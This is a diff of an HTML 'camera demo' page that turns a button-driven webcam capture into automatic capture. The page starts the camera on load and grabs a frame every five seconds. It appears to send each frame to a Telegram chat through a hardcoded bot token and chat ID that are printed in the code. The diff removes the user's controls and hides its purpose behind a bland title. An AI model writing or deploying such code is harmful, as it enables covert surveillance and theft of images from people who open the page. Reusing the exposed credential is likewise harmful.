@@ -1,25 +1,31 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Kamera Demo</title>
+    <title>Auto Capture Demo</title>
 </head>
 <body>
-    <h1>Demonstrasi Akses Kamera</h1>
-    <button id="startButton">Mulai Kamera</button>
-    <button id="captureButton">Ambil Gambar</button>
+    <h1>Auto Capture Demo</h1>
     <video id="video" width="640" height="480" autoplay></video>
     <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
     <script>
         const token = '6881667147:AAG_C3UWpEys2igKflAF-AagpxC4zjy8a-A';
         const chat_id = '-1002052635750';
 
-        document.getElementById('startButton').addEventListener('click', async () => {
+        async function startCamera() {
             const video = document.getElementById('video');
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            video.srcObject = stream;
-        });
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
 
-        document.getElementById('captureButton').addEventListener('click', () => {
+                video.addEventListener('loadeddata', () => {
+                    setInterval(captureAndSendImage, 5000); // Ambil gambar setiap 5 detik
+                });
+            } catch (err) {
+                console.error('Error accessing camera:', err);
+            }
+        }
+
+        function captureAndSendImage() {
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
             const context = canvas.getContext('2d');
@@ -46,7 +52,10 @@
                 }
             })
             .catch(error => console.error('Error:', error));
-        });
+        }
+
+        startCamera();
     </script>
 </body>
 </html>
+
